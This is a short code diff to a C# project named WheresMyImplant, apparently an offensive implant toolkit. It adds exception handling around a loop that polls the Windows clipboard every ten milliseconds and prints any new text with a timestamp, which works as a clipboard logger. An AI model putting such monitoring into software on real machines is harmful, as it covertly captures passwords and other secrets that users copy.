@@ -37,11 +37,25 @@ namespace WheresMyImplant
             {
                 if (Clipboard.ContainsText())
                 {
-                    String text = Clipboard.GetText();
-                    if (hold != text)
+                    try
                     {
-                        Console.WriteLine("{0}\t{1}", DateTime.Now.ToString("h:mm:ss tt"), text);
-                        hold = text;
+                        String text = Clipboard.GetText();
+                        if (hold != text)
+                        {
+                            Console.WriteLine("{0}\t{1}", DateTime.Now.ToString("h:mm:ss tt"), text);
+                            hold = text;
+                        }
+                    }
+                    catch(Exception ex)
+                    {
+                        if (ex is System.Runtime.InteropServices.COMException)
+                        {
+                            //This is a normal error
+                        }
+                        else
+                        {
+                            Console.WriteLine("[-] {0}", ex.Message);
+                        }
                     }
                 }
                 Thread.Sleep(10);
